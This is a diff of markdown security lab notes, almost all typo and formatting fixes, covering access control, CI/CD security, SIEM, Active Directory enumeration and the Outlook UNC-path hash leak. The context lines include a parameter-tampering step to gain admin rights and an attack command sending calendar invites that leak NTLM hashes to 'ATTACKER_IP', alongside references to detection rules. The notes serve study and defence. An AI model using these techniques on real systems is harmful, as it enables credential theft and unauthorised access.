@@ -210,7 +210,7 @@ Access control is implemented to ensure that only authorized users have acces to
 
 #### MAC - Mandatory Access Control
 
-**What:** Access to resrouces is determined by a set of predefined rules or policies enforced by the system. Commonly used in highly secure environment, such as govenment and military systems. Only specific individuals with particular security clearances can access certain resources.
+**What:** Access to resources is determined by a set of predefined rules or policies enforced by the system. Commonly used in highly secure environments, such as govenment and military systems. Only specific individuals with particular security clearances can access certain resources.
 
 #### RBAC - Role Based Access Control
 
@@ -229,7 +229,7 @@ Access control is implemented to ensure that only authorized users have acces to
 
 ### Practical
 
-The web application features a register,login, and dashboard page. When registering, one is forwarded to the login page, and after successfuly logging in, the registration page is shown. Using The BurpSuite Proxy, it's possible to manipulate the `POST` and `GET` requests and proxy them towards the web application. 
+The web application features a register, login, and dashboard page. When registering, one is forwarded to the login page, and after successfuly logging in, the registration page is shown. Using The BurpSuite Proxy, it's possible to manipulate the `POST` and `GET` requests and proxy them towards the web application. 
 
 By toggling the intercept after succesfully logging in, and setting the `/dashboard.php?isadmin=true` flag, the new user is able to receive admin rights.
 
@@ -237,7 +237,7 @@ By toggling the intercept after succesfully logging in, and setting the `/dashbo
 
 ### Mitigation
 
-Severa setps can be taken to mitigate Broken Access Control Vulns in PHP applications:
+Several steps can be taken to mitigate Broken Access Control Vulns in PHP applications:
 
 1. **Implement RBAC**
 
@@ -296,7 +296,7 @@ sudo systemctl start jenkins
 sudo ufw allow 8080
 sudo ufw allow OpenSSH
 ```
-Why Jenkins?
+**Why Jenkins?**
 
 Jenkins supports several automation patterns. It adds a powerful set of automation tools onto Jenkins, supporting use cases that span from simple CI to comprehensive CD pipelines. The advantages of using CICD pipelines is:
 
@@ -305,7 +305,7 @@ Jenkins supports several automation patterns. It adds a powerful set of automati
 * Extensibility
 * Pausability
 
-The basic pipeline to start with before security implementations:
+The basic pipeline to start with before any security implementations:
 ```
 pipeline {
     agent any
@@ -340,7 +340,7 @@ pipeline {
 ### SuiteCRM & SAST
 SuiteCRM is a Customer Relationship Management tool, which has the following dependencies: PHP, MYSQL, Apache Web Server. `SAST` (Static Application Security Testing) is a process that analyses a projects source code, dependencies, and related files for known security vulnerabilities. 
 
-Other usful plugins installed are for example `Snyk`, an open source security platform for detecting vulnerabilities in the source code of an application. The plugin integration can be added in the pipeline with:
+Other useful plugins installed are for example `Snyk`, an open source security platform for detecting vulnerabilities in the source code of an application. The plugin integration can be added in the pipeline with:
 
 ```jenkins
 stage ('Snyk Security'){
@@ -376,7 +376,7 @@ Cloud-Native means that an application is designed in such a way that it inherit
 * Containerized Infrastructure
 * CI/CD Development framework
 
-The aim of this lab was to perform SAST on an application through GitHub Actions and generate a report. Source Code Quality Analysis and generating bulls of materials for the application was also part of the scope, along with GitHub Action workflows.
+The aim of this lab was to perform SAST on an application through GitHub Actions and generate a report. Source Code Quality Analysis and generating bills of materials for the application was also part of the scope, along with GitHub Action workflows.
 
 ### SAST
 Static Analysis or `Static Application Security Testing` is a testing methodology that analyzes source code to find security vulnerabilities, also known as 'white-box testing'. SAST takes place very early in the software development life cycle (SDLC) as it does not require a working application and can take place without code being executed. 
@@ -413,7 +413,7 @@ Splunk is a powerful `SIEM solution` that provides the ability to search and exp
 
 Index being used: `index=Windowslogs`
 
-Time stamps being applie: `4/15/22 8:05:00.000 AM - 4/15/22 8:06:00.000 AM`
+Time stamps being applied: `4/15/22 8:05:00.000 AM - 4/15/22 8:06:00.000 AM`
 
 ### SPL Operators
 
@@ -564,7 +564,7 @@ In conclusion, this room covers the basic concepts of Endpoint Security Monitori
 ## Wazuh
 ![wazuh](./assets/images/wazuh.png)
 
-Wazuh operates on a management and agent model where the manager is responsible for managing agents installed on the devices you’d like to monitor. Devices that records the events and processes of a systems are called agents, and offload these to the manager (Wazuh)
+Wazuh operates on a management and agent model where the manager is responsible for managing agents installed on the devices you’d like to monitor. Devices that records the events and processes of a systems are called agents, and offload these to the manager (Wazuh).
 
 To deploy new agents:
 
@@ -647,10 +647,10 @@ The core of any Windows domain is the `Active Directory Domain Service (ADDS)`.
 
 **Users** are common object types, also known as one of the security principal objects in an AD, meaning that they can be authenticated and assigned privileges. Users can be either:
 
-    * People
-    * Services: like IIS or MSSQL. Requires a user to run, but will only have specific service-oriented privileges.
+* People
+* Services: like IIS or MSSQL. Requires a user to run, but will only have specific service-oriented privileges.
 
-**Machines:** For every computer that joins, a machine object and account will be created. The rights within that account are limiteed, but the accounts themselves are local administrators on the assigned computer. Passwords are random 120 char passes and automatically rotated. The account name is the computer's name followed by a dollar sign, like `DC01$`.
+**Machines:** For every computer that joins, a machine object and account will be created. The rights within that account are limited, but the accounts themselves are local administrators on the assigned computer. Passwords are random 120 char passes and automatically rotated. The account name is the computer's name followed by a dollar sign, like `DC01$`.
 
 **Security Groups:** Several groups are created by default in a domain, the most important ones are:
 
@@ -749,29 +749,29 @@ Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
 ```
 
 ### IP vs. Hostnames
-When providing a hostname, networking authentication will first attempt to use Kerberos authentication. Sinc Kerberos authentication uses hostames embedded in tickets, if an IP is provided, the authentication can be forced to be NTLM. 
+When providing a hostname, networking authentication will first attempt to use Kerberos authentication. Since Kerberos authentication uses hostames embedded in tickets, if an IP is provided, the authentication can be forced to be NTLM. 
 
 ### Microsoft Management Console
 The MMC can be used with `Remote Server Administration Tools (RSAT)` AD Snap-Ins. To download:
 
 `Apps & Features --> Manage Optional Features --> Add --> RSAT`
 
-With relevant permissions, it could be possible to make changes directly to AD with MMC the benefits outweigh the disadvantages:
+With relevant permissions, it could be possible to make changes directly to AD with MMC.
 
-Benefits
+**Benefits**
 
 * The GUI provides an excellent method to gain a holistic view of the AD environment.
 * Rapid searching of different AD objects can be performed.
 * It provides a direct method to view specific updates of AD objects.
 * If we have sufficient privileges, we can directly update existing AD objects or add new ones.
 
-Drawbacks
+**Drawbacks**
 
 * The GUI requires RDP access to the machine where it is executed.
 * Although searching for an object is fast, gathering AD wide properties or attributes cannot be performed.
 
 ### Enumerating Through Cmd Prompt & Powershell
-The Cmd Prompt is useful if other tools fail, and can be helpful to embed a couple of simple AD enumeration commands in a phishing payload. The builtin command `net` is a handy tool to enumerate information about the local systm and AD. `group` is a sub-option for `net`, and can be useful for enumeration AD groups, as is `accounts`.
+The Cmd Prompt is useful if other tools fail, and can be helpful to embed a couple of simple AD enumeration commands in a phishing payload. The builtin command `net` is a handy tool to enumerate information about the local system and AD. `group` is a sub-option for `net`, and can be useful for enumeration AD groups, as is `accounts`.
 
 Powershell has all the standard functionality that Cmd Prompt provides, plus access to cmdlets, .NET classes to perform specific functions. Handy enumeration commands used in the lab are:
 
@@ -801,14 +801,14 @@ PS C:\>$newPass = Read-Host -AsSecureString -Prompt 'Enter the new password'
 PS C:\>Set-ADAccountPassword -Identity user.name -OldPassword $oldpPass -NewPassword $newPass
 ```
 
-Benefits
+**Benefits**
 
 * The PowerShell cmdlets can enumerate significantly more information than the net commands from Command Prompt.
 * We can specify the server and domain to execute these commands using runas from a non-domain-joined machine.
 * We can create our own cmdlets to enumerate specific information.
 * We can use the AD-RSAT cmdlets to directly change AD objects, such as resetting passwords or adding a user to a specific group.
 
-Drawbacks
+**Drawbacks**
 
 * PowerShell is often monitored more by the blue teams than Command Prompt.
 * We have to install the AD-RSAT tooling or use other, potentially detectable, scripts for PowerShell enumeration.
@@ -817,7 +817,7 @@ Drawbacks
 Bloodhound is probably the most powerful AD enumeration tool to date, having changed the AD enumeration landscape forever since its release in 2016. 
 
 #### Graph-like thinking
-Bloodhound visualizes AD environments in a graph format with interconnected nodes, ranked in terms of privilege. This graph-based approach allows for a two-stage attack: initial entry via phishing (for example), quick banishment by a hopefully quick responding Blue team, and then a targeted second attack, where the enumeration info from the initial attack was planned out. 
+Bloodhound visualizes AD environments in a graph format with interconnected nodes, ranked in terms of privilege. This graph-based approach allows for a two-stage attack: initial entry via phishing (for example), quick banishment by a hopefully quick responding Blue team, and then a targeted second attack, where the enumeration info from the initial attack was used to plan out the second attack. 
 
 `Sharphound` is the enumeration tool of Bloodhound. It's used to enumerate information to visually display in Bloodhound, where Bloodhound is the GUI. The different collectors are:
 
@@ -859,7 +859,7 @@ Active Directory is widely used by almost every big organization. Some technique
     - Protection against known AD attacks
     - Havig a Recovery Plan (Post-compromise scenario)
 
-To expand a little on trust relationship from AD basics (above), AD trust is the established communication bridhe between the domains in Active Directory. One and Two-way sharing are trusts based on directions, and transitive trusts and non-transitive trusts are trusts based on characteristics:
+To expand a little on trust relationships from AD basics (above), AD trust is the established communication bridhe between the domains in Active Directory. One and Two-way sharing are trusts based on directions, and transitive trusts and non-transitive trusts are trusts based on characteristics:
 
 ![ad_trusts](./assets/images/ad_trusts.png)
 
@@ -954,7 +954,7 @@ On 14-03-2023 Microsoft released 83 security patches on Patch Tuesday, including
 ### Abusing Appointment Alerts via UNC Paths
 In Outlook, it's possible to add reminder notifications when sending calendar invtitations. It's possible to specify the audio file played for the notification. Manipulating this parameter can enable a threa actor to force Outlook to leak the current password hashes to an attacker with zero interaction required.
 
-TO do this, an attacker creates a malicious calendar invitation that includes a reference to a sound file pointing to a file in a network share in the attackers machine. Outlook stores the reference to the sound file in an internal parameter called `PidLidReminderFileParameter`. To override default configs on the victim machine, `PidLidReminderOverride` needs to be set to true.
+To do this, an attacker creates a malicious calendar invitation that includes a reference to a sound file pointing to a file in a network share in the attackers machine. Outlook stores the reference to the sound file in an internal parameter called `PidLidReminderFileParameter`. To override default configs on the victim machine, `PidLidReminderOverride` needs to be set to true.
 
 It was possible to specify a `UNC (Universal Naming Convention)` path instead of local one, which includes Network share paths like: `\\<Attacker IP>(@80/443)\foo\bar.wav`. When the victim receives the malicious email, the UNC path directs them to the SMB share, causing the system to start an NTLM authentication process against the attackers machine, leaking `Net-NTLMv2` hashes. If for some reason the SMB isnt a viable option, non-server versions of Windows will accept UNC paths to port 80 and 443 as well.
 
@@ -1022,9 +1022,9 @@ Send-CalendarNTLMLeak -recipient "test@thm.loc" -remotefilepath "\\ATTACKER_IP\f
 
 ### Detection and Mitigation
 
-[sigma_rule1](./assets/outlook_rules/sigma_rule1.txt) detects Outlook initiation a connection to a WebDav or SMB share, indicating a post-exploutation phase.
+[sigma_rule1](./assets/outlook_rules/sigma_rule1.yaml) detects Outlook initiation a connection to a WebDav or SMB share, indicating a post-exploutation phase.
 
-[sigma_rule2](./assets/outlook_rules/sigma_rule2.txt) looks to detect `svchost.exe` spawning `rundll32.exe` with command arguments like `C:\windows\system32\davclnt.dll,DavSetCookie`, which indicates a post-exploitation/exfiltration phase
+[sigma_rule2](./assets/outlook_rules/sigma_rule2.yaml) looks to detect `svchost.exe` spawning `rundll32.exe` with command arguments like `C:\windows\system32\davclnt.dll,DavSetCookie`, which indicates a post-exploitation/exfiltration phase
 
 This [yara_rule](./assets/outlook_rules/yara_rule.yar) looks for the pattern within the files on disk. It can be used to detect suspicious MSG files on the disk.
 
@@ -1055,12 +1055,12 @@ What makes this CVE an attractive attack vector, is that certificates can surviv
 
 Relevant terminology:
 
-**PKI** - Public Key Infrastructure is a system that manages certificates and public key encryption
-**AD CS** - Active Directory Certificate Services is Microsoft's PKI implementation which usually runs on domain controllers
-**CA** - Certificate Authority is a PKI that issues certificates
-**Certificate Template** - a collection of settings and policies that defines how and when a certificate may be issued by a CA
-**CSR** - Certificate Signing Request is a message sent to a CA to request a signed certificate
-**EKU** - Extended/Enhanced Key Usage are object identifiers that define how a generated certificate may be used
+1. **PKI** - Public Key Infrastructure is a system that manages certificates and public key encryption
+2. **AD CS** - Active Directory Certificate Services is Microsoft's PKI implementation which usually runs on domain controllers
+3. **CA** - Certificate Authority is a PKI that issues certificates
+4. **Certificate Template** - a collection of settings and policies that defines how and when a certificate may be issued by a CA
+5. **CSR** - Certificate Signing Request is a message sent to a CA to request a signed certificate
+6. **EKU** - Extended/Enhanced Key Usage are object identifiers that define how a generated certificate may be used
 
 ### CVE-2022-26923 explained
 AD usually runs on selected domain controllers, where certificate templates (created by AD CS admins) determine which user can request certificates and what is required for that to happen. Client Authentication allows owner of a certificate to verify their identity in AD.
